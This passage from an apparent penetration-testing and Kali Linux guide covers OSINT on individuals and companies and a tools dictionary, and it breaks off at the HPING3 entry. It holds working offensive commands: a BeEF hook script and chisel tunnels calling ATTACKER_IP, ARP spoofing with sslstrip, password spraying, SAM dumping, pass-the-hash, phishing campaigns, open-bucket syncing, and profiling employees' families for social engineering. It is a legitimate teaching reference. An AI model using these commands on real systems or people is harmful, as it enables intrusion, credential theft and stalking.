git clone https://github.com/Datalux/Osintgram.git
cd Osintgram
pip3 install -r requirements.txt

# Launch:
python3 main.py target_username

# Commands:
# info ‚Üí Profile information
# followers ‚Üí Follower list
# following ‚Üí Following list
# photos ‚Üí Download all photos
# comments ‚Üí Extract comments
# geolocation ‚Üí Extract geotagged locations

# Geolocation from photos:
# Download photo ‚Üí Extract EXIF:
exiftool photo.jpg | grep GPS

# Output:
# GPS Latitude: 40.7128
# GPS Longitude: -74.0060
# ‚Üí New York City!

# Map on Google Maps:
# https://www.google.com/maps?q=40.7128,-74.0060

# Facebook OSINT:

# Graph Search (limited now, but still useful):
# Search: "Photos of [Name]" ‚Üí All tagged photos
# Search: "Photos liked by [Name]" ‚Üí Interests
# Search: "Places visited by [Name]" ‚Üí Locations
# Search: "Friends of [Name]" ‚Üí Social network

# Automated scraping (use burner account):
from selenium import webdriver

driver = webdriver.Chrome()
driver.get('https://www.facebook.com/login')

# Login with burner account
# Navigate to target profile
# Scrape:
#   - Friends list
#   - Photos
#   - Check-ins (locations)
#   - Workplace
#   - Education
#   - Relationship status

# LinkedIn (covered in Part 6)

# GitHub OSINT:

# User enumeration:
curl "https://api.github.com/users/target_username"

# Output:
# {
#   "name": "John Doe",
#   "email": "john@company.com",
#   "bio": "Senior Developer at TechCorp",
#   "company": "TechCorp",
#   "location": "New York, NY"
# }

# List repositories:
curl "https://api.github.com/users/target_username/repos"

# Search for sensitive info:
# - API keys in code
# - Passwords in commits
# - Internal URLs
# - Employee names (in commit messages)

# Tool: GitHound
git clone https://github.com/tillson/git-hound
cd git-hound
go build

./git-hound --subdomain-file subdomains.txt --dig-files --dig-commits

# Searches for:
# - AWS keys
# - API tokens
# - Database credentials
# - Private keys
# In both code and commit history!

# Reddit OSINT:

# Search: "company_name"
# Sort by: Relevant, New, Top
# Look for:
#   - Employee complaints
#   - Security discussions
#   - Leaked information
#   - Technical details

# Tool: Pushshift Reddit API
import requests

def search_reddit(keyword):
    url = f"https://api.pushshift.io/reddit/search/comment/?q={keyword}&size=100"
    response = requests.get(url)
    data = response.json()
    
    for comment in data['data']:
        print(f"Author: {comment['author']}")
        print(f"Subreddit: {comment['subreddit']}")
        print(f"Comment: {comment['body'][:200]}")
        print(f"URL: https://reddit.com{comment['permalink']}")
        print("-" * 40)

# YouTube OSINT:

# Company channel ‚Üí Video metadata:
#   - Upload dates (activity timeline)
#   - Employee names (in credits)
#   - Office tour videos (physical layout!)
#   - Product demos (technology stack)

# Employee personal channels:
#   - Location (in about section)
#   - Interests (for social engineering)
#   - Family info
#   - Personal email (in channel contact)

# Discord/Slack OSINT:

# Join public servers
# Search for employees
# Monitor conversations for:
#   - Technical discussions
#   - Security practices
#   - Internal tools mentioned
#   - Complaints about security</div>

            <h3>Part 10: OSINT Automation & Frameworks</h3>

            <div class="code"># Spiderfoot = Automated OSINT powerhouse

# Install:
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
pip3 install -r requirements.txt

# Run:
python3 sf.py -l 127.0.0.1:5001

# Web UI: http://127.0.0.1:5001

# Create new scan:
# Target: company.com
# Modules: Select all (or specific categories)
# Run scan!

# What Spiderfoot does automatically:
# 1. WHOIS lookup
# 2. DNS enumeration
# 3. Subdomain discovery
# 4. Email harvesting
# 5. Social media profiles
# 6. Shodan/Censys lookups
# 7. Breach database checks
# 8. Certificate transparency
# 9. IP geolocation
# 10. Port scanning
# 11. Web crawling
# 12. Dark web monitoring
# And 100+ more modules!

# CLI mode:
python3 sf.py -s company.com -m all -o json

# Photon = Web OSINT crawler

# Install:
git clone https://github.com/s0md3v/Photon.git
cd Photon
pip3 install -r requirements.txt

# Crawl website:
python3 photon.py -u https://company.com

# Output folders:
# - robots.txt
# - sitemap.xml
# - External links
# - Internal links
# - JavaScript files
# - CSS files
# - Images
# - Documents (PDF, DOC, etc.)

# Extract data:
python3 photon.py -u https://company.com --extract all

# Extracts:
# - Emails
# - Phone numbers
# - Social media links
# - AWS keys
# - IP addresses
# - URLs

# Phone number OSINT:

# Tool: PhoneInfoga
git clone https://github.com/sundowndev/PhoneInfoga
cd PhoneInfoga
go build

./phoneinfoga scan -n "+1-555-0100"

# Output:
# Country: United States
# Carrier: Verizon
# Type: Mobile
# Valid: Yes
# Possible locations: New York, NY

# Also searches:
# - Google (for number mentions)
# - Social media (linked accounts)
# - Truecaller
# - Leaked databases

# Email OSINT:

# Tool: Holehe
pip3 install holehe

# Check where email is registered:
holehe email@company.com

# Output:
# [+] Twitter: Registered
# [+] Instagram: Registered
# [+] Facebook: Registered
# [+] LinkedIn: Registered
# [-] Spotify: Not registered
# [+] GitHub: Registered

# Username OSINT:

# Tool: Sherlock
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
pip3 install -r requirements.txt

# Search username across 300+ sites:
python3 sherlock.py johndoe123

# Output:
# [+] GitHub: https://github.com/johndoe123
# [+] Twitter: https://twitter.com/johndoe123
# [+] Instagram: https://instagram.com/johndoe123
# [+] Reddit: https://reddit.com/user/johndoe123
# ... (300+ sites checked)

# Facial recognition OSINT:

# Tool: PimEyes.com
# Upload photo ‚Üí Finds ALL instances on internet
# Shows:
#   - Social media profiles
#   - News articles
#   - Company websites
#   - Dating profiles
#   - Forums

# Google Reverse Image Search:
# Upload photo ‚Üí Find similar images + sources

# Yandex (even better than Google for faces):
# yandex.com/images ‚Üí Upload ‚Üí More accurate face matching

# Cryptocurrency OSINT:

# Bitcoin address lookup:
# blockchain.com/btc/address/[ADDRESS]

# Shows:
# - Total received
# - Total sent
# - Current balance
# - All transactions
# - Associated addresses

# Tool: Maltego Bitcoin transforms
# Map entire transaction network!

# Dark web monitoring:

# Tool: OnionScan
git clone https://github.com/s-rah/onionscan.git
cd onionscan
go build

./onionscan --verbose company.com

# Scans Tor hidden services for:
# - Leaked data
# - Company mentions
# - Credentials for sale
# - Dark web marketplaces

# OSINT framework websites:

# 1. osintframework.com
# ‚Üí Categorized list of OSINT tools

# 2. start.me/p/DPYPMz/the-ultimate-osint-collection
# ‚Üí Bookmarks for OSINT resources

# 3. inteltechniques.com/tools/
# ‚Üí Michael Bazzell's custom OSINT tools

# 4. bellingcat.com
# ‚Üí Open source investigations case studies

# 5. tracelabs.org
# ‚Üí Missing persons OSINT (practice your skills!)

# Complete OSINT automation script:

import subprocess
import json

def full_osint(target):
    results = {}
    
    # 1. theHarvester
    print("[*] Running theHarvester...")
    subprocess.run(['theHarvester', '-d', target, '-b', 'all', '-f', 'harvest'])
    
    # 2. Amass
    print("[*] Running Amass...")
    subprocess.run(['amass', 'enum', '-passive', '-d', target, '-o', 'amass_results.txt'])
    
    # 3. Shodan
    print("[*] Searching Shodan...")
    subprocess.run(['shodan', 'search', f'hostname:{target}', '-O', '-o', 'shodan_results.txt'])
    
    # 4. Subfinder
    print("[*] Running Subfinder...")
    subprocess.run(['subfinder', '-d', target, '-o', 'subdomains.txt'])
    
    # 5. Httpx (check live subdomains)
    print("[*] Checking live hosts...")
    subprocess.run(['httpx', '-l', 'subdomains.txt', '-o', 'live_hosts.txt'])
    
    # 6. Nuclei (vulnerability scan)
    print("[*] Running Nuclei...")
    subprocess.run(['nuclei', '-l', 'live_hosts.txt', '-o', 'vulnerabilities.txt'])
    
    # 7. WhatsMyName (username search)
    print("[*] Searching usernames...")
    subprocess.run(['whatsmyname', '-u', target])
    
    # 8. HaveIBeenPwned check
    print("[*] Checking breach databases...")
    # (API call as shown earlier)
    
    print("[+] OSINT complete! Results saved.")

# Run:
full_osint('company.com')</div>

            <h3>Part 11: Adversary Infrastructure Profiling</h3>

            <div class="code"># Advanced: Map entire company infrastructure

# Step 1: IP range identification

# Method 1: WHOIS ASN lookup
whois -h whois.radb.net -- '-i origin AS12345'

# Method 2: BGP looking glass
# bgp.he.net/AS12345

# Method 3: SecurityTrails API
import requests

def get_company_ips(company_name):
    api_key = "YOUR_API_KEY"
    url = f"https://api.securitytrails.com/v1/company/{company_name}"
    headers = {'APIKEY': api_key}
    
    response = requests.get(url, headers=headers)
    data = response.json()
    
    for cidr in data['records']:
        print(f"IP Range: {cidr}")

# Step 2: Subdomain enumeration (comprehensive)

# Passive sources:
# - Certificate Transparency (crt.sh)
# - VirusTotal
# - SecurityTrails
# - DNSDumpster
# - Shodan
# - Censys

# Active brute force:
# - Fierce
# - Amass
# - Subfinder
# - Gobuster DNS mode

# Combine all results:
cat crtsh.txt virustotal.txt securitytrails.txt > all_subdomains.txt
sort -u all_subdomains.txt > unique_subdomains.txt

# Step 3: Service identification

# Scan all IPs + subdomains:
nmap -sV -p- -iL targets.txt -oA full_scan

# Parse nmap output:
import xml.etree.ElementTree as ET

def parse_nmap_xml(xml_file):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    for host in root.findall('host'):
        ip = host.find('address').get('addr')
        
        for port in host.findall('.//port'):
            portid = port.get('portid')
            service = port.find('service')
            
            if service is not None:
                name = service.get('name')
                product = service.get('product', '')
                version = service.get('version', '')
                print(f"{ip}:{portid} ‚Üí {name} {product} {version}")

# Step 4: Technology identification

# Tool: Wappalyzer (CLI)
npm install -g wappalyzer

# Scan:
wappalyzer https://company.com

# Output:
# WordPress 6.0
# PHP 8.1
# MySQL
# Cloudflare
# Google Analytics
# jQuery 3.6

# Tool: WhatWeb
whatweb -a 3 https://company.com

# Tool: BuiltWith API
import requests

def builtwith_lookup(domain):
    api_key = "YOUR_API_KEY"
    url = f"https://api.builtwith.com/v20/api.json?KEY={api_key}&LOOKUP={domain}"
    response = requests.get(url)
    data = response.json()
    
    for tech in data['Results'][0]['Result']['Paths'][0]['Technologies']:
        print(f"{tech['Name']}: {tech.get('Description', 'N/A')}")

# Step 5: Cloud asset discovery

# AWS:
# - S3 buckets: bucket-name.s3.amazonaws.com
# - CloudFront: d123456.cloudfront.net
# - API Gateway: abc123.execute-api.us-east-1.amazonaws.com
# - Elastic Beanstalk: app-name.us-east-1.elasticbeanstalk.com

# Azure:
# - Blob storage: storage-name.blob.core.windows.net
# - Web apps: app-name.azurewebsites.net
# - Databases: server-name.database.windows.net

# GCP:
# - Cloud Storage: storage.googleapis.com/bucket-name
# - App Engine: project-id.appspot.com
# - Cloud Functions: region-project-id.cloudfunctions.net

# Enumerate S3 buckets:
# Tool: s3scanner
git clone https://github.com/sa7mon/S3Scanner
cd S3Scanner
pip3 install -r requirements.txt

# Create bucket wordlist:
echo "company" > buckets.txt
echo "company-prod" >> buckets.txt
echo "company-dev" >> buckets.txt
echo "company-backup" >> buckets.txt

# Scan:
python3 s3scanner.py -l buckets.txt

# Test bucket permissions:
aws s3 ls s3://company-backup --no-sign-request

# If accessible:
aws s3 sync s3://company-backup . --no-sign-request

# Step 6: GitHub reconnaissance

# Search code for company references:
# GitHub advanced search:
# - company.com in:file
# - @company.com in:file
# - api.company.com in:file

# Tool: GitDorker
git clone https://github.com/obheda12/GitDorker
cd GitDorker
pip3 install -r requirements.txt

python3 GitDorker.py -tf github_token.txt -d dorks.txt -org CompanyName

# Searches for:
# - API keys
# - Passwords
# - AWS credentials
# - Database strings
# - Internal URLs

# Step 7: Certificate analysis

# Tool: certgraph
git clone https://github.com/lanrat/certgraph
cd certgraph
go build

./certgraph -s company.com -depth 5 -save company.json

# Builds graph of certificate relationships
# Discovers:
# - Related domains
# - Infrastructure connections
# - Hidden subdomains
# - Sister companies

# Step 8: Email infrastructure

# MX records:
dig company.com MX

# SPF record:
dig company.com TXT | grep spf

# DMARC:
dig _dmarc.company.com TXT

# DKIM:
dig default._domainkey.company.com TXT

# Email security check:
# Tool: emailrep.io
curl "https://emailrep.io/john@company.com"

# Output:
# - Reputation score
# - Known breaches
# - Associated domains
# - Suspicious activity

# Step 9: Network mapping

# Traceroute to find network path:
traceroute company.com

# TCP traceroute (more reliable):
sudo traceroute -T company.com

# MTR (continuous traceroute):
mtr company.com

# Identify:
# - ISP
# - Hosting provider
# - Geographic routing
# - Network hops
# - Potential bottlenecks

# Step 10: Mobile app analysis

# Android APK:
# Download from Google Play Store
# Tool: apkpure.com or apkmirror.com

# Extract APK:
unzip app.apk

# Decompile:
apktool d app.apk

# Search for:
# - API endpoints (grep -r "http" .)
# - API keys (grep -r "api_key" .)
# - Hardcoded credentials
# - Internal URLs

# iOS IPA:
# Requires jailbroken device or tools like frida

# Dynamic analysis:
# Install app ‚Üí Intercept traffic with Burp Suite

# Complete infrastructure map:

# After all reconnaissance, you have:
# ‚úÖ IP ranges
# ‚úÖ Subdomains (100+)
# ‚úÖ Open ports + services
# ‚úÖ Technologies used
# ‚úÖ Cloud assets (S3, Azure blobs)
# ‚úÖ Email infrastructure
# ‚úÖ Employee list
# ‚úÖ Breach credentials
# ‚úÖ GitHub repos + secrets
# ‚úÖ Mobile app endpoints
# ‚úÖ Network topology

# Visualize with mind map:
# Tool: MindMeister, XMind, or text-based:

"""
Company Infrastructure Map:
‚îú‚îÄ‚îÄ Web Assets
‚îÇ   ‚îú‚îÄ‚îÄ www.company.com (192.0.2.10) - Nginx 1.21, WordPress 6.0
‚îÇ   ‚îú‚îÄ‚îÄ api.company.com (192.0.2.11) - Python/Flask, AWS
‚îÇ   ‚îî‚îÄ‚îÄ admin.company.com (192.0.2.12) - Laravel, MySQL
‚îú‚îÄ‚îÄ Mail Servers
‚îÇ   ‚îú‚îÄ‚îÄ mail1.company.com (192.0.2.20) - Postfix
‚îÇ   ‚îî‚îÄ‚îÄ mail2.company.com (192.0.2.21) - Postfix
‚îú‚îÄ‚îÄ Cloud Assets
‚îÇ   ‚îú‚îÄ‚îÄ S3: company-backups (public read!)
‚îÇ   ‚îî‚îÄ‚îÄ Azure: company-prod.azurewebsites.net
‚îú‚îÄ‚îÄ Employees
‚îÇ   ‚îú‚îÄ‚îÄ john.doe@company.com (LinkedIn, GitHub, Twitter)
‚îÇ   ‚îî‚îÄ‚îÄ jane.smith@company.com (LinkedIn, breached: LinkedIn2012)
‚îî‚îÄ‚îÄ Vulnerabilities
    ‚îú‚îÄ‚îÄ Subdomain takeover: dev.company.com
    ‚îú‚îÄ‚îÄ Open S3 bucket: company-backups
    ‚îî‚îÄ‚îÄ Exposed admin panel: admin.company.com (no auth!)
                1. <strong>Domain enumeration:</strong> theHarvester, Recon-ng ‚Üí Find subdomains, emails<br>
                2. <strong>Infrastructure mapping:</strong> Shodan, Maltego ‚Üí Map IPs, services, technologies<br>
                3. <strong>Employee discovery:</strong> LinkedIn, Hunter.io ‚Üí Find names, roles, emails<br>
                4. <strong>Credential hunting:</strong> Breach databases, pastes, Google dorking ‚Üí Find leaked passwords<br>
                5. <strong>Vulnerability identification:</strong> Shodan (CVEs), exposed services, misconfigurations<br>
                6. <strong>Attack surface analysis:</strong> Combine all data ‚Üí Identify weakest entry points<br><br>
                <strong>OSINT resources:</strong><br>
                ‚Ä¢ <strong>OSINT Framework:</strong> https://osintframework.com/ (tool catalog)<br>
                ‚Ä¢ <strong>IntelTechniques:</strong> Michael Bazzell's books and resources<br>
                ‚Ä¢ <strong>Bellingcat:</strong> Open-source investigation techniques<br>
                ‚Ä¢ <strong>HaveIBeenPwned:</strong> Breach database (haveibeenpwned.com)<br>
                ‚Ä¢ <strong>Dehashed:</strong> Search engine for breached databases<br><br>
                OSINT is 50%+ of a pentest. Know your target before attacking! üîçüìä</p>
            </div>
        </section>

        <!-- SECTION 12: Remaining Kali Tools Dictionary -->
        <section id="remaining-tools" class="section">
            <h2 class="section-title">Comprehensive Kali Linux Tools Dictionary</h2>
            <p class="section-intro">Kali Linux ships with 600+ tools across every hacking domain. This alphabetical dictionary covers 100+ essential tools with descriptions, syntax, flags, and quick examples. Use this as your quick reference guide during CTFs, pentests, and learning. Tools are organized alphabetically with cross-references to deep-dive sections elsewhere in this guide. Each entry includes: category, installation, basic usage, key flags, and practical example. Let's build your ultimate hacking tool vocabulary! üõ†Ô∏è</p>

            <div class=\"metaphor-box\">
                <h4>üí° Your Kali Toolbox at a Glance</h4>
                <p><strong>Tool categories:</strong><br><br>
                ‚Ä¢ <strong>Information Gathering:</strong> Reconnaissance, OSINT, enumeration<br>
                ‚Ä¢ <strong>Vulnerability Analysis:</strong> Scanners, fuzzers, exploit verification<br>
                ‚Ä¢ <strong>Web Application Analysis:</strong> Proxy, scanner, injection testing<br>
                ‚Ä¢ <strong>Database Assessment:</strong> SQL injection, database enumeration<br>
                ‚Ä¢ <strong>Password Attacks:</strong> Cracking, brute forcing, rainbow tables<br>
                ‚Ä¢ <strong>Wireless Attacks:</strong> WiFi, Bluetooth, RFID, SDR<br>
                ‚Ä¢ <strong>Reverse Engineering:</strong> Disassemblers, decompilers, debuggers<br>
                ‚Ä¢ <strong>Exploitation Tools:</strong> Exploit frameworks, payload generators<br>
                ‚Ä¢ <strong>Sniffing & Spoofing:</strong> Network analysis, MITM, poisoning<br>
                ‚Ä¢ <strong>Post Exploitation:</strong> Persistence, privilege escalation, lateral movement<br>
                ‚Ä¢ <strong>Forensics:</strong> File carving, memory analysis, timeline creation<br>
                ‚Ä¢ <strong>Reporting Tools:</strong> Documentation, evidence preservation<br><br>
                <strong>Tip:</strong> Use <code>apt-cache search [keyword]</code> to find tools by category!<br>
                <strong>Example:</strong> <code>apt-cache search wireless | grep -i hack</code> ‚Üí Find all wireless hacking tools</p>
            </div>

            <h3>A-Tools</h3>

            <div class=\"code\"># ========== AIRCRACK-NG ==========
# Category: Wireless Attacks
# Purpose: Complete WiFi cracking suite (WEP, WPA/WPA2)

# Install (pre-installed in Kali):
sudo apt install aircrack-ng

# Key tools in suite:
# - airmon-ng   ‚Üí Enable monitor mode
# - airodump-ng ‚Üí Capture packets
# - aireplay-ng ‚Üí Inject packets, deauth
# - aircrack-ng ‚Üí Crack captured handshakes

# Basic workflow (see Bonus Part 1 for detailed guide):
sudo airmon-ng start wlan0        # Enable monitor mode ‚Üí wlan0mon
sudo airodump-ng wlan0mon         # Scan for networks
sudo airodump-ng -c 6 --bssid [MAC] -w capture wlan0mon  # Capture handshake
sudo aireplay-ng -0 5 -a [AP_MAC] wlan0mon               # Deauth to force handshake
aircrack-ng -w wordlist.txt capture-01.cap               # Crack handshake

# ========== AMASS ==========
# Category: Information Gathering
# Purpose: Subdomain enumeration (passive + active)

sudo apt install amass

# Passive enumeration (no target contact):
amass enum -passive -d company.com

# Active enumeration (includes DNS brute force):
amass enum -active -d company.com -brute -w subdomains.txt

# Output to file:
amass enum -d company.com -o subdomains.txt

# Use with other tools:
amass enum -d company.com | httprobe > live_subdomains.txt

# ========== ARMITAGE ==========
# Category: Exploitation Tools
# Purpose: GUI for Metasploit (team collaboration)

sudo apt install armitage

# Launch (requires Metasploit database):
sudo msfdb init        # First time only
sudo armitage

# Features:
# - Point-and-click exploit selection
# - Visual network map
# - Team server for collaboration
# - Automated exploitation workflows

# Use case: Red team engagements with multiple operators

# ========== AUTOPSY ==========
# Category: Forensics
# Purpose: Digital forensics platform (GUI for Sleuthkit)
# See Section 1 for detailed guide

sudo apt install autopsy

# Launch:
autopsy

# Web interface: http://localhost:9999/autopsy

# Create case ‚Üí Add image ‚Üí Analyze!

# ========== AWK (Pattern Scanning) ==========
# Category: Utility
# Purpose: Text processing, log analysis

# Extract specific columns from output:
cat access.log | awk '{print $1}'    # Print first column (IP addresses)

# Filter by condition:
netstat -an | awk '/ESTABLISHED/ {print $5}'  # Show established connections

# Sum values:
cat numbers.txt | awk '{sum += $1} END {print sum}'

# Use case: Parse nmap output, extract IPs from logs</div>

            <h3>B-Tools</h3>

            <div class=\"code\"># ========== BEEF (Browser Exploitation Framework) ==========
# Category: Exploitation Tools
# Purpose: Client-side attacks via web browser

sudo apt install beef-xss

# Start BeEF:
sudo beef-xss

# Web UI: http://127.0.0.1:3000/ui/panel
# Default creds: beef / beef

# Hook browser with JavaScript:
<script src=\"http://ATTACKER_IP:3000/hook.js\"></script>

# Once browser is hooked:
# - Execute commands
# - Keylog
# - Redirect
# - Social engineering attacks
# - Detect plugins, browser info

# ========== BETTERCAP ==========
# Category: Sniffing & Spoofing
# Purpose: Modern MITM framework (replaces Ettercap)

sudo apt install bettercap

# Interactive mode:
sudo bettercap

# Enable modules:
¬ª net.probe on              # Discover hosts
¬ª net.show                  # Show discovered hosts
¬ª set arp.spoof.targets 192.168.1.100  # Target specific host
¬ª arp.spoof on              # Start ARP spoofing
¬ª net.sniff on              # Capture traffic

# HTTP/HTTPS proxy:
¬ª set http.proxy.sslstrip true
¬ª http.proxy on

# Credentials harvesting:
¬ª set net.sniff.filter \"port 80 or port 21 or port 110\"

# Scripting (caplets):
bettercap -caplet caplet.cap

# ========== BINWALK ==========
# Category: Forensics / Reverse Engineering
# Purpose: Firmware analysis, file carving
# See Section 1 for detailed guide

sudo apt install binwalk

# Analyze firmware:
binwalk firmware.bin

# Extract embedded files:
binwalk -e firmware.bin

# Entropy analysis (find encrypted sections):
binwalk -E firmware.bin

# Signature scan:
binwalk -B firmware.bin

# ========== BURP SUITE ==========
# Category: Web Application Analysis
# Purpose: Web proxy, scanner, intruder
# See Bonus Part 1 for detailed guide

# Community Edition (pre-installed):
burpsuite

# Key features:
# - Proxy: Intercept HTTP/HTTPS
# - Repeater: Modify and resend requests
# - Intruder: Automated attacks (brute force, fuzzing)
# - Scanner: Vulnerability detection (Pro only)
# - Extensions: Add custom functionality

# Pro version:
# - Active scanner
# - Faster intruder
# - Scheduled scans</div>

            <h3>C-Tools</h3>

            <div class=\"code\"># ========== CHISEL ==========
# Category: Post Exploitation
# Purpose: Fast TCP/UDP tunnel over HTTP (pivot)

# Download latest:
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

# On attacker (server):
./chisel server -p 8080 --reverse

# On target (client):
./chisel client ATTACKER_IP:8080 R:1080:socks

# Use with proxychains:
proxychains nmap -sT 10.10.10.0/24

# ========== CRACKMAPEXEC (CME) ==========
# Category: Post Exploitation
# Purpose: Active Directory attacks, SMB enumeration

sudo apt install crackmapexec

# SMB enumeration:
crackmapexec smb 192.168.1.0/24                    # Find SMB hosts
crackmapexec smb 192.168.1.100 -u '' -p ''        # Null session
crackmapexec smb 192.168.1.100 -u admin -p password123  # Auth check

# Password spraying:
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!'

# Dump SAM:
crackmapexec smb 192.168.1.100 -u admin -p password123 --sam

# Execute commands:
crackmapexec smb 192.168.1.100 -u admin -p password123 -x \"whoami\"

# Pass-the-Hash:
crackmapexec smb 192.168.1.100 -u admin -H [NTLM_HASH]

# ========== COMMIX ==========
# Category: Web Application Analysis
# Purpose: Command injection exploitation

sudo apt install commix

# Basic scan:
commix --url=\"http://target.com/page.php?id=1\"

# POST parameter:
commix --url=\"http://target.com/login.php\" --data=\"user=admin&pass=1\"

# Cookie injection:
commix --url=\"http://target.com/\" --cookie=\"session=VALUE\"

# Custom injection point:
commix --url=\"http://target.com/page.php?id=INJECT_HERE\"

# ========== CRUNCH ==========
# Category: Password Attacks
# Purpose: Custom wordlist generator

sudo apt install crunch

# Generate 4-8 character wordlist (lowercase):
crunch 4 8 -o wordlist.txt

# Specific character set:
crunch 6 6 0123456789 -o pins.txt    # 6-digit PINs

# Pattern:
crunch 8 8 -t @@@@%%%% -o wordlist.txt
# @ = lowercase
# , = uppercase
# % = numbers
# ^ = special

# Example: Password2024!
crunch 13 13 -t Password%%%%^ -o custom.txt

# Pipe to aircrack:
crunch 8 8 | aircrack-ng -w - -b [BSSID] capture.cap</div>

            <h3>D-Tools</h3>

            <div class=\"code\"># ========== DIRB ==========
# Category: Web Application Analysis
# Purpose: Web directory/file brute forcing

sudo apt install dirb

# Basic scan:
dirb http://target.com/

# Custom wordlist:
dirb http://target.com/ /path/to/wordlist.txt

# Extensions:
dirb http://target.com/ -X .php,.txt,.bak

# Save output:
dirb http://target.com/ -o results.txt

# Use proxy:
dirb http://target.com/ -p http://127.0.0.1:8080

# ========== DIRBUSTER ==========
# Category: Web Application Analysis
# Purpose: GUI directory brute forcer

dirbuster

# GUI workflow:
# 1. Target URL: http://target.com
# 2. Wordlist: /usr/share/wordlists/dirbuster/
# 3. File extensions: php, txt, bak
# 4. Threads: 10
# 5. Start!

# ========== DNSENUM ==========
# Category: Information Gathering
# Purpose: DNS enumeration (subdomains, zone transfers)

sudo apt install dnsenum

# Basic enumeration:
dnsenum company.com

# Try zone transfer:
dnsenum --enum company.com

# Custom DNS server:
dnsenum --dnsserver 8.8.8.8 company.com

# Save output:
dnsenum --output results.xml company.com

# ========== DNSRECON ==========
# Category: Information Gathering
# Purpose: DNS reconnaissance and enumeration

sudo apt install dnsrecon

# Standard enumeration:
dnsrecon -d company.com

# Zone transfer:
dnsrecon -d company.com -t axfr

# Brute force subdomains:
dnsrecon -d company.com -t brt -D /usr/share/wordlists/dnsmap.txt

# Reverse lookup (find domains on IP):
dnsrecon -r 192.168.1.0/24

# Google dorking for subdomains:
dnsrecon -d company.com -t goo

# ========== DMITRY ==========
# Category: Information Gathering
# Purpose: Deepmagic Information Gathering Tool

sudo apt install dmitry

# All checks:
dmitry -winsepo results.txt company.com

# Flags:
# -w  ‚Üí WHOIS lookup
# -i  ‚Üí IP WHOIS
# -n  ‚Üí Netcraft.com lookup
# -s  ‚Üí Subdomain search
# -e  ‚Üí Email search
# -p  ‚Üí Port scan
# -o  ‚Üí Output to file</div>

            <h3>E-Tools</h3>

            <div class=\"code\"># ========== ENUM4LINUX ==========
# Category: Information Gathering
# Purpose: SMB/Windows enumeration

sudo apt install enum4linux

# Full enumeration:
enum4linux -a 192.168.1.100

# Specific checks:
enum4linux -U 192.168.1.100    # Users
enum4linux -S 192.168.1.100    # Shares
enum4linux -G 192.168.1.100    # Groups
enum4linux -P 192.168.1.100    # Password policy

# With credentials:
enum4linux -u admin -p password123 192.168.1.100

# ========== ETTERCAP ==========
# Category: Sniffing & Spoofing
# Purpose: MITM attacks, ARP poisoning

sudo apt install ettercap-graphical

# GUI mode:
sudo ettercap -G

# Workflow:
# 1. Sniff ‚Üí Unified sniffing ‚Üí Select interface
# 2. Hosts ‚Üí Scan for hosts
# 3. Select target 1 (victim) ‚Üí Add to Target 1
# 4. Select target 2 (gateway) ‚Üí Add to Target 2
# 5. Mitm ‚Üí ARP poisoning ‚Üí Sniff remote connections
# 6. Start sniffing!

# CLI mode (ARP poisoning):
sudo ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//

# ========== EXIFTOOL ==========
# Category: Forensics / OSINT
# Purpose: Read/write/edit metadata

sudo apt install exiftool

# View metadata:
exiftool image.jpg

# View specific field:
exiftool -Author document.pdf

# Remove ALL metadata:
exiftool -all= image.jpg

# Geolocation from photo:
exiftool -gps:all image.jpg

# Batch process:
exiftool -all= *.jpg

# Extract thumbnail:
exiftool -b -ThumbnailImage image.jpg > thumbnail.jpg

# ========== EXPLOITDB ==========
# Category: Exploitation Tools
# Purpose: Local copy of Exploit-DB

sudo apt install exploitdb

# Search exploits:
searchsploit apache

# Filter by platform:
searchsploit linux kernel 3.13

# Show exploit path:
searchsploit -p 12345

# Copy exploit to current directory:
searchsploit -m 12345

# Update database:
searchsploit -u</div>

            <h3>F-G-Tools</h3>

            <div class=\"code\"># ========== FIERCE ==========
# Category: Information Gathering
# Purpose: DNS scanner, subdomain brute force

sudo apt install fierce

# Basic scan:
fierce --domain company.com

# Use custom wordlist:
fierce --domain company.com --wordlist subdomains.txt

# Specific DNS server:
fierce --domain company.com --dns-servers 8.8.8.8

# ========== FOREMOST ==========
# Category: Forensics
# Purpose: File carving from disk images
# See Section 1 for detailed guide

sudo apt install foremost

# Carve deleted files:
foremost -i disk.img -o output/

# Specific file types:
foremost -t jpg,png,pdf -i disk.img -o output/

# ========== GOBUSTER ==========
# Category: Web Application Analysis
# Purpose: Directory/DNS brute forcing (faster than dirb)

sudo apt install gobuster

# Directory brute force:
gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt

# Add extensions:
gobuster dir -u http://target.com/ -w wordlist.txt -x php,txt,html

# DNS subdomain brute force:
gobuster dns -d company.com -w subdomains.txt

# Virtual host discovery:
gobuster vhost -u http://target.com -w wordlist.txt

# With authentication:
gobuster dir -u http://target.com -w wordlist.txt -U admin -P password123

# ========== GOPHISH ==========
# Category: Social Engineering
# Purpose: Phishing campaign framework

sudo apt install gophish

# Start:
sudo gophish

# Web interface: https://127.0.0.1:3333
# Default creds: admin / gophish

# Workflow:
# 1. Create email template
# 2. Create landing page
# 3. Import user list (CSV)
# 4. Configure sending profile (SMTP)
# 5. Launch campaign
# 6. Track results (opened emails, clicked links, submitted credentials)

# ========== GREENBONE / OPENVAS ==========
# Category: Vulnerability Analysis
# Purpose: Vulnerability scanner

sudo apt install gvm

# Setup (first time):
sudo gvm-setup
sudo gvm-start

# Web interface: https://127.0.0.1:9392
# Credentials shown after gvm-setup

# Create scan:
# 1. Configuration ‚Üí Targets ‚Üí New target
# 2. Scans ‚Üí Tasks ‚Üí New task
# 3. Start scan
# 4. View results ‚Üí Generate report</div>

            <h3>H-Tools</h3>

            <div class=\"code\"># ========== HASHCAT ==========
# Category: Password Attacks
# Purpose: GPU-accelerated password cracking
# See Bonus Part 1 for detailed guide

sudo apt install hashcat

# Benchmark:
hashcat -b

# Crack MD5:
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Crack NTLM (Windows):
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Brute force (8 chars, lowercase):
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# Rules (mangle wordlist):
hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule

# Show cracked:
hashcat -m 0 hash.txt --show

# ========== HPING3 ==========
